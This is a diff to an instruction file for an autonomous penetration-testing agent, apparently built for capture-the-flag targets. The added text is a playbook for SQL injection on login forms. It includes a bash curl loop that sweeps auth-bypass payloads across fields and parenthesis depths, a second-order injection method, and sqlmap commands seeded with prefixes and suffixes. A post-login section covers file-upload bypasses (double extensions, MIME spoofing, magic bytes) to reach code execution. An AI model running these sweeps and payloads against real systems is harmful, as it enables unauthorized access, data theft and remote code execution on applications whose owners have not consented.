@@ -34,6 +34,76 @@ Tamper scripts: {sqli_tamper_scripts}
 
 ## MANDATORY SQL INJECTION WORKFLOW
 
+### GATE A (blocking) — On a LOGIN / AUTH form, auth-bypass IS the objective; DB-extraction is FORBIDDEN until the bypass sweep is exhausted and on record.
+
+A boolean/content oracle on a login is BAIT for a database-dump rabbit hole. Seeing an oracle is
+NOT permission to run `--dbs` / `--dump` / `LOAD_FILE` / `INTO OUTFILE` or to crack a hash. Those
+actions are **PROHIBITED while any auth-bypass avenue on the same form is un-swept.** You may turn
+to extraction, file-read, or cracking against a login ONLY AFTER the full matrix below is on record
+and has failed on every cell. (This gate applies only to login/auth surfaces — for a non-login
+injection where the objective genuinely is a stored row, Step 0-A still routes you to extraction.)
+
+**Mandatory auth-bypass matrix — fill EVERY cell before any extraction, and record each result:**
+- **Fields (rows): test EVERY submitted field as its own injection point — the identifier field
+  (username/email) AND the secret field (password/PIN/token) AND any hidden field.** Do NOT stop
+  after the identifier field. A login typically runs MORE THAN ONE query (an existence/lookup, then
+  a credential check), and the SECRET field frequently interpolates into a LATER query than the
+  identifier — so it is often the ONLY winning sink. **Skipping the secret field is the single most
+  common reason a solvable login is wrongly declared "not bypassable."**
+- **Shapes (columns): per field** — comment-truncation (`-- -`, `#`), always-true (`' OR 1=1-- -`),
+  parenthesis-balanced variants, and a one-row `UNION SELECT` of a constant.
+- **Oracle:** the app's own response differential (a `Success` / redirect / session-set state vs a
+  wrong-credentials state) is the pass/fail signal for each cell.
+
+**Run the whole bypass matrix as ONE scripted sweep — do NOT hand-fire probes across iterations.**
+A sequential multi-probe search (send a shape, read, send the next) is the thing an agent abandons
+half-done the moment a shinier extraction/crack lead appears — which loses the run. Remove that failure
+mode: your FIRST exploitation action on a login MUST be a SINGLE `kali_shell` script that enumerates the
+entire bypass space in one call and prints ONLY the payload whose response differs from the wrong-
+credentials baseline. Enumerate mechanically; do not reason your way down to one guess. The sweep space:
+- **every submitted field** as the injection point (identifier, secret/password, hidden), holding the
+  OTHER fields at values that pass earlier checks (for an existence oracle, an identifier you have
+  confirmed valid via the oracle);
+- **every breakout shape**: comment styles (`-- -`, `#`), always-true (`OR 1=1`, `OR 'a'='a'`), and a
+  one-row `UNION SELECT`;
+- **a RANGE of closing-paren counts** prepended before the tail (0, 1, 2, 3, … up through several — 5-6
+  is ample, deeper nesting is rare). A value interpolated INSIDE function calls (a password inside
+  `MD5(...)` / `CONCAT(...)` / a cast) needs its enclosing parens balanced before `OR` parses, and you
+  do NOT know the nesting depth a priori — the script tries the whole range and READS which one flips.
+  A field being wrapped in a hash is NOT evidence it is un-injectable; it is a prime breakout point.
+
+Generic skeleton — adapt endpoint + field names to the live form; keep it fully generic, memorise no
+value (uses only placeholders + enumerated ranges):
+
+    URL="http://<target>/<login-endpoint>"
+    BASE=$(curl -s "$URL" --data-urlencode "<idfield>=<an-id-the-oracle-says-is-valid>" --data-urlencode "<secretfield>=wrongpw")
+    for FIELD in <idfield> <secretfield> <hiddenfields...>; do
+      for CLOSE in "" ")" "))" ")))" "))))" ")))))"; do
+        for TAIL in "OR 1=1-- -" "OR 1=1#" "OR 'a'='a'-- -" "UNION SELECT 1-- -"; do
+          P="'$CLOSE $TAIL"
+          R=$(curl -s "$URL" --data-urlencode "$FIELD=$P" --data-urlencode "<other-fields=benign/valid>")
+          test "$R" != "$BASE" && echo "FLIP field=$FIELD payload=[$P] -> $R"
+        done
+      done
+    done
+
+The payload(s) printed as a FLIP are your bypass: replay one, keep the returned session cookie, and
+pivot to the authenticated surface (Step 7). ONLY if the sweep prints nothing across ALL fields, shapes,
+and paren depths may you treat the login as non-bypassable.
+
+**Two inferences FORBIDDEN until that scripted sweep has RUN and printed nothing (each has cost whole runs):**
+- **"The password is verified in application code, so a SQL bypass is impossible."** Not admissible from
+  a shallow `OR 1=1` that failed — a login returning a distinct wrong-password state is still running SQL
+  you have not fully broken out of. The full sweep (all fields, all depths) must be on record first.
+- **Forging a `UNION SELECT` row that returns a password hash whose plaintext you know.** A login that
+  RE-DERIVES the hash server-side (any `password = <FUNC>( ... )` shape) can NEVER match an injected hash
+  — it recomputes from the stored identifier/salt, not from your row. A wrong-password result there means
+  "keep breaking out of the query," NOT "switch to cracking." Do not manufacture MD5 / bcrypt / double-
+  hash rows for a re-hashing login; that is an unwinnable side-quest.
+
+Only when the scripted sweep — every field × shape × paren depth — is on record and empty may you treat
+the login as non-bypassable and move on.
+
 ### Step 0: Triage the objective and the injection surface FIRST (decision gate)
 
 Before extracting anything, answer two questions and let them route the whole workflow.
@@ -65,6 +135,28 @@ exhaustive sweep, NOT a single guess:
   can leave the second intact, so the winning sink may be a **different field or the second
   query**. A single failed comment payload does NOT prove bypass is impossible — you may only
   conclude "no auth bypass" after the full (field x shape) sweep is on record.
+
+**B1. Second-order / value-reuse injection (decisive for multi-query logins).**
+When a login (or any workflow) fetches a value in one query and then interpolates that FETCHED
+value into a later query, the later query's real injection point is the DATA you can make the
+first query return -- NOT your raw input field. Direct payloads in your own input often cannot
+bypass here, because the second query re-derives its comparison from the genuine row and still
+demands the real secret. So a clean auth form that resists every direct payload is NOT proof the
+class is dead -- it is the signal to look for value-reuse. Handle it mechanically, and do NOT
+declare "no auth bypass" until you have tried it:
+  1. Infer the structure from the oracle: if a valid-identifier payload flips the response
+     independently of the password, assume an existence/lookup query feeds a later credential
+     query, and that the looked-up value is reused downstream.
+  2. Use `UNION SELECT '<marker>'` in the first field to CONTROL the exact string the first query
+     returns; confirm you control it by reflecting a benign unique marker end to end.
+  3. Once you control that returned value, embed a SQL breakout INSIDE it -- a quote plus a comment
+     to truncate the later query's remaining conditions, or a `UNION SELECT` that yields one row --
+     so the later query returns a row WITHOUT the real secret. A row returned there IS the session
+     grant; pivot to Step 7 immediately.
+Because the payload travels through the database before detonating, escape and quote it for the
+SECOND query's context, not the first (a literal quote inside a string literal is written by
+doubling it). This is standard second-order injection and generalizes to any place a stored or
+just-fetched value is concatenated into a later query.
 
 ### Step 1: Target Analysis (execute_curl)
 
@@ -103,6 +195,16 @@ kali_shell("sqlmap -u 'TARGET_URL' --data='param1=value1&param2=value2' -p param
 ```
 kali_shell("sqlmap -u 'TARGET_URL' --cookie='session=abc123' --level=2 --batch --random-agent --dbs")
 ```
+
+**If the oracle only reacts when a VALID value prefixes your payload** (e.g. the boolean sits on
+top of an existence/lookup check, so `nonexistent' OR ...` and `nonexistent' AND ...` look
+identical), sqlmap's stock payloads will report "not injectable" because they never satisfy the
+lookup. Seed it with a known-good value and pin the context so its payloads reach the live branch:
+```
+kali_shell("sqlmap -u 'TARGET_URL' --data='user=<known-good>&pass=x' -p user --prefix=\"' \" --suffix=\"-- -\" --batch --random-agent")
+```
+A single "not injectable" verdict does NOT close the class — re-test manually with the oracle
+before abandoning it.
 
 Parse the output for:
 - DBMS type (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
@@ -203,6 +305,14 @@ STOP extracting and pivot — auth-bypass access, `LOAD_FILE` / `INTO OUTFILE`, 
 surface. Do NOT keep extracting version / current-user / schema once they are no longer on the
 path to the objective; enumerating DBMS metadata is not progress toward an objective that does not live in the database.
 
+**Do NOT crack a retrieved password hash to "log in."** If the objective is ACCESS and any
+auth-bypass avenue (Gate A) is still un-swept, cracking a dumped hash is almost never the intended
+path — a deliberately strong or placeholder secret is a standard bait, and burning iterations on a
+password the challenge chose to be uncrackable is a classic dead-end. Cracking is a legitimate axis
+ONLY when the secret ITSELF is the objective. Never spend more than one bounded attempt cracking a
+credential while a Gate A cell is unfilled; if your cracking tool fails to run (missing OpenCL,
+wordlist errors, etc.), that is a signal to pivot, not to keep re-invoking it.
+
 ### Step 7: Post-SQLi Escalation (if possible)
 
 Attempt these ONLY if initial exploitation succeeded:
@@ -213,6 +323,27 @@ app's own now-reachable authenticated features — file upload, import/export, p
 actions, or any sink that stores or reflects user input — which frequently lead to RCE or a
 direct file read faster than any further SQL. Enumerate the authenticated surface with the new
 session BEFORE returning to database work.
+
+**Mandatory post-auth re-recon (a session opens NEW surface).** The instant a bypass grants a
+session, you MUST (a) re-run content discovery AUTHENTICATED (crawl links + dir-fuzz while sending
+the session cookie) — dashboards, upload/import, admin, and profile pages were invisible pre-login
+and only appear now; and (b) if the newly reachable surface is a DIFFERENT vulnerability class,
+`switch_skill` to it instead of forcing more SQL tradecraft onto a non-SQL sink.
+
+**If the new surface is a file upload / import:** the extension/type check is frequently a substring
+match, a client-side-only check, or Content-Type-only. Bypass it generically and then REQUEST the
+stored file to trigger execution:
+- **Double extension** — name the file so it both contains a permitted extension AND ends in an
+  executable one (e.g. `x.jpg.php`, `x.jpg.phtml`) when the server only checks that the name
+  *contains* an allowed type or trusts the last-but-one segment.
+- **Content-Type spoof** — send an allowed MIME (`image/png`, `image/jpeg`) with executable bytes
+  when only the declared type is validated.
+- **Magic-byte prefix** — prepend allowed file-signature bytes (e.g. `GIF89a` / `\x89PNG`) ahead of
+  your code when server-side content sniffing is used.
+- **Case / trailing tricks** — `.PhP`, trailing dot/space/null on the name.
+A dropped file the server then EXECUTES is code execution; use it to read the objective from disk
+(the target flag/file often lives outside the web root, e.g. at filesystem root or `/`). If a
+dedicated upload/RCE skill is available, `switch_skill` to it for the full playbook.
 
 **File read** (requires FILE privilege):
 ```
@@ -342,6 +473,12 @@ admin'/*
 ' OR 1=1 LIMIT 1--
 ' OR 1=1#
 ```
+
+**Second-order (multi-query logins):** if the app reuses a value it just SELECTed as a string in
+a later query, inject THROUGH that returned value, not your input field. Make the first query
+return your payload, e.g. `x' UNION SELECT '<your second-query breakout>'-- -`, and let it detonate
+in the later query (comment out its remaining credential check, or `UNION SELECT` one row). Direct
+payloads that fail against a two-query login are the cue to try this, not to abandon the class.
 
 ### WAF Bypass Encoding Quick Reference
 | Technique | Example | Use When |
